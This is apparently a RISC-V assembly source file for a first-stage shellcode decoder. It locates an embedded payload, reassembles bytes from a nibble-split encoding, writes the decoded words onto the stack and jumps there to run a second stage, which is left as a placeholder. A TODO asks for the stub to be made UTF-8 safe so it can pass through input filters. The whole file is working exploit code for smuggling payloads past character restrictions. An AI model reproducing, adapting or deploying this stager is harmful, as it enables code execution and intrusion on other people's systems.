#
# TODO: Change this first stage to be UTF-8 safe.  You will probably
# also need to change the payload encoding format.
#
	.globl	_start
	
	.text
_start:
# get payload address into s0
        auipc   s0, 0xfffff
        addi    s0, s0, 0x7ff
        addi    s0, s0, 0x7ff
        addi    s0, s0, 44
# load 8 bytes of 0x0F into a2
	li	t1, 0x0F0F
	c.xor	a2, a2
	c.add	a2, t1
	c.slli	a2, 16
	c.add	a2, t1
	c.slli	a2, 16
	c.add	a2, t1
	c.slli	a2, 16
	c.add 	a2, t1
# get count into s1
	c.ld	s1, 0(s0)
	c.ld	a5, 8(s0)
	c.addi	s0, 16
	c.and	s1, a2
	c.and	a5, a2
	c.slli	a5, 4
	c.add	s1, a5
0:
# get word to write into a0
	c.ld	a0, 0(s0)
	c.ld	a1, 8(s0)
	c.addi	s0, 16

	c.and	a0, a2
	c.and	a1, a2
	c.slli	a1, 4
	c.add	a0, a1

#	c.xor	a0, a1

# store a0 on the stack
	c.addi	sp, -8
	c.sdsp	a0, 0(sp)
# loop
	c.addi	s1, -1
	c.bnez	s1, 0b
## jump to stage 2
	c.jr	sp
	.data
payload:
# SECOND STAGE SUBSTITUTED HERE
